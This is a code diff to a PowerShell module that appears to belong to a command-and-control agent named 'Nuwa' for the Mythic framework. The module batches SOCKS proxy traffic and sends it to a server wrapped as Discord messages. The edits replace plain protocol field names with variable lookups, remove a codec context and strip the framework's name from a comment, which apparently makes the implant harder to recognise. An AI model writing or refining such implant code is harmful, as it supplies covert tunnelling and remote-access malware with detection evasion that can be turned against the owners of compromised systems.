@@ -20,8 +20,7 @@ function New-NuwaSocksOutboundDocument {
     if (-not (Test-NuwaCanonicalUuid -Value $uuid)) {
         throw 'SOCKS callback route is unavailable'
     }
-    $context = Get-NuwaCodecContext -Direction 'outbound' -Uuid $uuid -MessageType 'post_response'
-    [byte[]]$wire = ConvertTo-NuwaWireBytes -Message $Message -Context $context
+    [byte[]]$wire = ConvertTo-NuwaWireBytes -Message $Message -Context @{}
     [byte[]]$frame = New-NuwaTransportRequestBody -Uuid $uuid -WireBody $wire
     $document = ConvertTo-NuwaDiscordMessageWrapper -Message $frame -SenderId $uuid -ToServer $true
     if ([System.Text.Encoding]::UTF8.GetByteCount($document) -gt 2097152) {
@@ -42,9 +41,9 @@ function New-NuwaSocksOutboundBatch {
         $selected = -1
         for ($index = 0; $index -lt $Worker.Outbound.Count; $index += 1) {
             $candidate = $Worker.Outbound[$index]
-            $key = [string]$candidate.server_id
+            $key = [string]$candidate[$script:NuwaF_server_id]
             if ($round.Contains($key)) { continue }
-            if ($records.Count -gt 0 -and $bytes + ([byte[]]$candidate.data).Length -gt 49152) {
+            if ($records.Count -gt 0 -and $bytes + ([byte[]]$candidate[$script:NuwaF_data]).Length -gt 49152) {
                 continue
             }
             $selected = $index
@@ -58,9 +57,9 @@ function New-NuwaSocksOutboundBatch {
         $record = $Worker.Outbound[$selected]
         $Worker.Outbound.RemoveAt($selected)
         $records.Add($record)
-        [void]$servers.Add([string]$record.server_id)
-        [void]$round.Add([string]$record.server_id)
-        $bytes += ([byte[]]$record.data).Length
+        [void]$servers.Add([string]$record[$script:NuwaF_server_id])
+        [void]$round.Add([string]$record[$script:NuwaF_server_id])
+        $bytes += ([byte[]]$record[$script:NuwaF_data]).Length
     }
     if ($records.Count -eq 0) { throw 'SOCKS outbound batch could not fit a record' }
     if ($Worker.Outbound.Count -eq 0) {
@@ -69,7 +68,10 @@ function New-NuwaSocksOutboundBatch {
         $Worker.LastOutboundAt = $Worker.FirstOutboundAt
     }
     [byte[]]$batchId = New-NuwaSocksBatchId -Worker $Worker
-    $message = @{ action = 'post_response'; socks = $records.ToArray(); socks_batch_id = $batchId }
+    $message = @{}
+    $message[$script:NuwaF_action] = $script:NuwaA_post_response
+    $message[$script:NuwaF_socks] = $records.ToArray()
+    $message[$script:NuwaF_socks_batch_id] = $batchId
     $document = New-NuwaSocksOutboundDocument -Message $message
     return @{
         Id = [BitConverter]::ToString($batchId).Replace('-', '')
@@ -153,7 +155,7 @@ function Update-NuwaSocksOutbound {
         } finally { $active.Content.Dispose() }
 
         if ($status -ge 200 -and $status -lt 300) {
-            # The channel accepted this immutable batch. Mythic's ingress
+            # The channel accepted this immutable batch. The ingress
             # ledger still suppresses duplicates if a recovery later replays it.
             if ($null -ne $Worker.Pending -and $Worker.Pending.Id -eq $batch.Id) {
                 $Worker.Pending = $null
